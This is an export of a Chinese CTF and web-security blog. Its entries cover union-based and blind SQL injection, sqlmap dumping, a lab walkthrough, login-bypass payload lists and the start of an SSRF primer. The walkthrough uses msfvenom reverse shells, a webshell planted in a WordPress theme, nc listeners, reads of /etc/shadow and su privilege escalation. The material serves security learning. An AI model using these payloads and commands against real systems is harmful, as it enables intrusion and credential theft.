-<h4 id="3-2-获取数据库表名"><a href="#3-2-获取数据库表名" class="headerlink" title="3.2 获取数据库表名"></a>3.2 获取数据库表名</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,table_name from information_schema.tables where table_schema=&#x27;name&#x27;#</span><br><span class="line"># name为数据库名</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="3-3-获取字段名"><a href="#3-3-获取字段名" class="headerlink" title="3.3 获取字段名"></a>3.3 获取字段名</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;name&#x27;#</span><br><span class="line"># name 为表名</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="3-4-获取字段中的记录"><a href="#3-4-获取字段中的记录" class="headerlink" title="3.4 获取字段中的记录"></a>3.4 获取字段中的记录</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(name1,name2) from column_name#</span><br><span class="line"># name1,name2 为字段名 column_name 为表名</span><br><span class="line"></span><br><span class="line">-1&#x27; union select name1,name2 from colunm_name#</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><p><strong>盲注</strong>就是在SQL注入过程中，SQL语句执行后，查询到的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br><strong>布尔盲注</strong>：SQL语句执行后，页面不返回具体数据，数据库只返回1或者0(真or假)。类似于无法开口说话的人，只能通过点头和摇头来告诉你答案的正确与否。<br>**时间盲注:**在页面中，不管用户输入什么，数据交互完成以后目标网站没有错误和正确的页面回显，这种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行。</p>
-<h3 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1. 布尔盲注"></a>1. 布尔盲注</h3><h4 id="1-1-判断是否存在注入"><a href="#1-1-判断是否存在注入" class="headerlink" title="1.1 判断是否存在注入"></a>1.1 判断是否存在注入</h4><p>第一步:正常查询，返回True(语句执行成功)或者返回False(语句执行成功没有查询到内容)。<br>第二步:输入引号进行看页面变化，页面返回False，可能存在漏洞，也可能没有查询到内容。<br>第三步:利用and进行判断，比如:1 and 1&#x3D;1和1 and 1&#x3D;2，1’and 1&#x3D;1#和1’and 1&#x3D;2#，如果前者执行的结果不一样，说明是数字型的布尔盲注;如果后者执行的结果不一样，说明是字符型的布尔盲注。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 and 1=1;</span><br><span class="line">select * from users where id=1 and 1=2;</span><br><span class="line">select * from users where id=&#x27;1&#x27; and 1=1#&#x27;;</span><br><span class="line">select * from users where id=&#x27;1&#x27; and 1=2#&#x27;;</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="1-2-获取数据库长度"><a href="#1-2-获取数据库长度" class="headerlink" title="1.2. 获取数据库长度"></a>1.2. 获取数据库长度</h4><p>因为无法通过页面数据回显获取数据，所以只能靠判断对错的方式来获取数据，可以使用MySQL中的内置函数获取字符串长度:<br>**length():**单位是字节，utf8编码下,一个汉字三个字节，一个数字或字母一个字节。gbk编码下,一个汉字两个字节，一个数字或字母一个字节。<br>**char_length():**单位为字符，不管汉字还是数字或者是字母都算是一个字符。</p>
-<p>例如：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select length(databese());</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>但是在盲注中是无法回显select的输出的</strong></p>
-<p>所以尝试得到长度可以用burp爆破或者二分(利用&gt;、&lt;、&#x3D;)：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and length(database())&lt;10%23</span><br></pre></td></tr></table></figure></div>
-
-<p>正确的长度会得到正确回显</p>
-<p>上传到数据库的语句为：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; and length(database())&lt;10#&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="1-3-获取数据库名"><a href="#1-3-获取数据库名" class="headerlink" title="1.3. 获取数据库名"></a>1.3. 获取数据库名</h4><ul>
-<li>利用substr(string,start,length)截取字符串</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27;%23</span><br></pre></td></tr></table></figure></div>
-
-<p>依次判断数据库名的每个字符，然后得到数据库名，这里采用将字母转换为ASCII码然后用burp的<strong>集束炸弹</strong>进行爆破</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and ascii(substr(database(),1,1))=115 %23</span><br></pre></td></tr></table></figure></div>
-
-<p>然后选定payload位置</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and ascii(substr(database(),$1$,1))=$115$ %23</span><br></pre></td></tr></table></figure></div>
-
-<p>第一个位置范围为1-8（数据库名长度），第二个位置范围为65-122（大小写字母ASCII码范围）</p>
-<p>爆破完成得到数据库名<strong>security</strong></p>
-<p>&#x3D;&#x3D;<strong>然后依次得到表名和字段名</strong>&#x3D;&#x3D;</p>
-<blockquote>
-<p>以上为布尔盲注，以下为时间盲注</p>
-</blockquote>
-<h3 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2. 时间盲注"></a>2. 时间盲注</h3><h4 id="2-1-判断是否存在注入"><a href="#2-1-判断是否存在注入" class="headerlink" title="2.1. 判断是否存在注入"></a>2.1. 判断是否存在注入</h4><p>利用时间函数sleep()进行判断</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and sleep(5) %23</span><br></pre></td></tr></table></figure></div>
-
-<p>然后查看“网络”界面的请求耗时，如果正好相差五秒，则为时间盲注。</p>
-<h4 id="2-2获取数据库长度"><a href="#2-2获取数据库长度" class="headerlink" title="2.2获取数据库长度"></a>2.2获取数据库长度</h4><p>在上面布尔盲注的基础上，这里要加上if()条件判断语句</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(exp1,cmd1,cmd2)</span><br><span class="line"># 如果exp1为真，执行cmd1，否则执行cmd2</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())=8,sleep(5),1) %23</span><br></pre></td></tr></table></figure></div>
-
-<p>然后比较“网络”界面的请求耗时，或者直接在burp爆破结果中勾选响应时间的选项，然后找到不一样的那个</p>
-<p>之后的步骤同布尔盲注</p>
-<hr>
-<h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>以下演示为windows中，如果在kali中，则可以直接执行sqlmap</p>
-<h3 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1. 判断是否存在注入"></a>1. 判断是否存在注入</h3><div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span></span><br><span class="line">python sqlmap.py -u &quot;http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&amp;page=<span class="number">10</span>&quot; -p page </span><br><span class="line">python sqlmap.py -u &quot;http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&amp;page=<span class="number">10</span>&quot; -p page --batch </span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>-u:指定URL</li>
-<li>-p:url多参数时指定注入点</li>
-<li>–batch:自动化测试，需要选择时全部默认Y(注入过程可能比较久)</li>
-</ul>
-<h3 id="2-获取信息"><a href="#2-获取信息" class="headerlink" title="2. 获取信息"></a>2. 获取信息</h3><div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> --dbs</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> -D security --tables</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> -D security -T users --columns</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> -D security -T users -C id,username,password --dump</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><p>–dbs:获取数据库名</p>
-</li>
-<li><p>–tables:获取数据库表名</p>
-</li>
-<li><p>–columns:获取字段名</p>
-</li>
-<li><p>-D,-T,-C:分别表示指定数据库、表、字段</p>
-</li>
-<li><p>–dump:获取字段内容(慎用)</p>
-</li>
-</ul>
-<h3 id="3-多目标"><a href="#3-多目标" class="headerlink" title="3. 多目标"></a>3. 多目标</h3><p>把要测试的url放入一个txt文件里，使用-m参数执行txt文件</p>
-<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -m test.txt</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="4-需要登录"><a href="#4-需要登录" class="headerlink" title="4. 需要登录"></a>4. 需要登录</h3><p>需要先获取自己的cookie，然后利用–cookie参数进行执行</p>
-<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u  http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&amp;Submit=submit# -p id --cookie cookie --dbs --batch</span><br></pre></td></tr></table></figure></div>
-
-<p>利用sqlmap进行注入的user-agent头文件有明显的sqlmap</p>
-<p>于是可以使用–random-agent 参数随机UA头，或者利用–user-agent&#x3D;UA，使用自己的UA头。</p>
-<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> --random-agent</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sq1i/Less-<span class="number">1</span>/?id=<span class="number">1</span> --user-agent=&quot;Mozi11a/<span class="number">4</span>.<span class="number">0</span> (compatible; MSIE <span class="number">6</span>.<span class="number">0</span>: Windows NT <span class="number">5</span>.<span class="number">0</span>: de) Opera <span class="number">8</span>.<span class="number">0</span>&#x27;</span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入（IP命令行）</title>
-    <url>/2024/09/11/3bc19a255208/</url>
-    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><strong>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</strong></p>
-<p><strong>SQL注入的产生原因通常表现在以下几方面:①不当的类型处理;②不安全的数据库配置;③不合理的查询集处理;④不当的错误处理;⑤转义字符处理不合适;⑥多个提交处理不当。</strong></p>
-<h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br><span class="line">nikto -host http://ip:port</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><p>打开敏感页面 比如什么登录页面 &#x2F;admin&#x2F;login.php</p>
-<p>尝试弱口令登录，失败</p>
-<h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3.漏洞扫描"></a>3.漏洞扫描</h2><blockquote>
-<p>web漏洞扫描器 owasp-zap<br>OWASP ZAP攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助您在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。</p>
-</blockquote>
-<p>输入ip进行attack，然后软件开始爬虫并扫描</p>
-<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="4-1-发现高危漏洞sql注入"><a href="#4-1-发现高危漏洞sql注入" class="headerlink" title="4.1 发现高危漏洞sql注入"></a>4.1 发现高危漏洞sql注入</h3><p>对扫描结果进行分析，发现高危漏洞SQL注入</p>
-<p>利用sqlmap利用SQL注入漏洞</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u url # 查看是否具有sql注入</span><br><span class="line">sqlmap -u url --dbs # 查看数据库名</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; --tables # 查看对应数据库中的数据表</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; --columns # 查看对应字段/列 </span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; -C &quot;列名&quot; --dump # 查看对应字段的值</span><br><span class="line">sqlmap -u url -os -shell #尝试直接获取shell</span><br><span class="line"># 注：所有的名称可以用 &quot;,&quot; 隔开以获取多个值</span><br></pre></td></tr></table></figure></div>
-
-<p>查找到对应的用户名和密码，登录系统</p>
-<p>上传shell反弹权限</p>
-<p>生成反弹shell</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP lport=未使用的端口 -f raw</span><br></pre></td></tr></table></figure></div>
-
-<p>将生成的shell保存到php文件中</p>
-<p>监听</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 攻击机IP地址 </span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<p>然后上传webshell，实现反弹，获取flag</p>
-<h3 id="4-2-未发现高危漏洞"><a href="#4-2-未发现高危漏洞" class="headerlink" title="4.2 未发现高危漏洞"></a>4.2 未发现高危漏洞</h3><p>但是通过前面的信息探测发现了登陆界面 如 &#x2F;phpmyadmin &#x2F;login.php 等</p>
-<p>然后尝试弱口令登录，无法登录，想到利用post sql注入</p>
-<h4 id="4-2-1-抓取数据包"><a href="#4-2-1-抓取数据包" class="headerlink" title="4.2.1 抓取数据包"></a>4.2.1 抓取数据包</h4><p>利用bp抓取网页数据包，注意设置浏览器代理，然后将抓取的数据包保存到request.raw文件里</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 --dbs --dbms mysql --batch</span><br><span class="line"># -r参数用于指定 SQLMap 工具所使用的 HTTP 请求文件</span><br><span class="line"># --level 5 表示最高级别的攻击。</span><br><span class="line"># --risk 3 表示非常高的风险。</span><br><span class="line"># --dbs: 这个选项表示 SQLMap 将尝试获取目标数据库的信息。</span><br><span class="line"># --dbms mysql: 这个选项指定了目标数据库管理系统的类型，这里是 MySQL。</span><br><span class="line"># --batch: 这个选项指定了在批处理模式下运行 SQLMap，即不需要用户交互。</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h4 id="4-2-2-进行sql注入"><a href="#4-2-2-进行sql注入" class="headerlink" title="4.2.2 进行sql注入"></a>4.2.2 进行sql注入</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 --tables --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users --columns --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>得到用户名和密码</p>
-<p>因为前面信息扫描出&#x2F;wordpress 目录，所以可以确定网站利用wordpress的CMS，然后wordpress的默认登录后台页面为</p>
-<p><code>/wordpress/wp-login.php</code></p>
-<p>输入用户名和密码，登陆后台。</p>
-<h4 id="4-2-3-反弹shell"><a href="#4-2-3-反弹shell" class="headerlink" title="4.2.3 反弹shell"></a>4.2.3 反弹shell</h4><p>然后也是上传webshell获得控制权</p>
-<p>利用自带的反弹shell</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> php-reverse-shell.php /root/Desktop/</span><br></pre></td></tr></table></figure></div>
-
-<p>然后将复制的shell进行修改，修改端口和ip为&#x3D;&#x3D;攻击机ip&#x3D;&#x3D;</p>
-<p>启动监听</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp port <span class="comment">#对应的端口4444</span></span><br></pre></td></tr></table></figure></div>
-
-<p>访问上传webshell的地址(上传到404页面)</p>
-<p>&#x3D;&#x3D;http:&#x2F;&#x2F;靶场IP:port&#x2F;目录&#x2F;wp-content&#x2F;themes&#x2F;主题名&#x2F;404.php&#x3D;&#x3D;</p>
-<p>成功反弹</p>
-<p>然后优化终端</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="4-2-4-提权"><a href="#4-2-4-提权" class="headerlink" title="4.2.4 提权"></a>4.2.4 提权</h4><p>查看敏感文件</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
-
-<p>利用su提权</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su -root</span><br></pre></td></tr></table></figure></div>
-
-<p>发现空密码无法提权，然后尝试前面获取的密码（和后台密码相同）</p>
-<p>提权成功</p>
-<p>然后到&#x2F;root目录获取flag</p>
-<h2 id="5-X-Forward-For-sql注入"><a href="#5-X-Forward-For-sql注入" class="headerlink" title="5. X-Forward-For sql注入"></a>5. X-Forward-For sql注入</h2><h3 id="5-1-漏洞扫描"><a href="#5-1-漏洞扫描" class="headerlink" title="5.1 漏洞扫描"></a>5.1 漏洞扫描</h3><p>&#x3D;&#x3D;漏洞扫描器 AVWS&#x3D;&#x3D;</p>
-<p>扫描出X-Forwarded-For sql注入</p>
-<h3 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h3><p>利用sqlmap</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; --dbs --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; --tables --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>成功获取用户名和密码，登录到后台</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>万能登陆密码</title>
-    <url>/2024/09/11/d77af8045ce5/</url>
-    <content><![CDATA[<h1 id="绕过登陆常用万能密码"><a href="#绕过登陆常用万能密码" class="headerlink" title="绕过登陆常用万能密码"></a>绕过登陆常用万能密码</h1><p>所谓万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。</p>
-<h3 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">2：&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">3：or 1=1--</span><br><span class="line"></span><br><span class="line">4：&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">5：a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">7：&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">8：&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<p>admin’or 1&#x3D;1#</p>
-<h3 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h3><p>admin’&#x2F;*<br>密码*&#x2F;‘<br>‘or 1&#x3D;1&#x2F;*</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&quot;or1=1--</span><br><span class="line"></span><br><span class="line">&quot;or=or&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;) or (&#x27;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1/*</span><br><span class="line"></span><br><span class="line">&#x27;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27; &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or1=1--</span><br><span class="line"></span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27;1=1--</span><br><span class="line"></span><br><span class="line">or &#x27;a&#x27;=&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">or 1=1--</span><br><span class="line"></span><br><span class="line">or1=1--</span><br></pre></td></tr></table></figure></div>
-
-
-
-]]></content>
-      <categories>
-        <category>common</category>
-      </categories>
-      <tags>
-        <tag>common</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>服务器请求伪造（SSRF）</title>
-    <url>/2024/09/11/fdbfb64754f6/</url>
-    <content><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
-<p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
-<p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
-<ul>
-<li>读取内网文件;</li>
-<li>扫描内网服务和端口;</li>
-<li>收集内网 web 应用的指纹识别，根据这些信息进行下一步的渗透:</li>
-<li>攻击运行在内网的系统或应用程序.</li>
-</ul>
-<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>漏洞点：</strong>能够对外发起网络请求的服务器，就可能存在SSRF漏洞</p>
-<p><strong>web功能</strong></p>
-<p>服务器端请求伪造漏洞是在服务端获取其他服务器的相关信息的功能中形成的，因此我们可以列举几种在web应用中常见的从服务端获取其他服务器信息的的功能:</p>
-<ol>
-<li>分享URL:通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</li>
-<li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</li>
-<li>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</li>
-<li>图片加载与下载:通过URL地址加载或下载图片。</li>
-<li>通过api获取远程地址文件来加载内容。</li>
-</ol>
-<p><strong>URL关键字</strong></p>
-<p>寻找需要加载外部资源的URL，可能存在SSRF漏洞。这些URL中经常包含的关键词有<code>share、wap、ur1、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code>等利用 google 语法(inurl:url&#x3D;)加上这些关键字去寻找 SSRF 漏洞，耐心的验证，可以找到存在的 SSRF漏洞。</p>
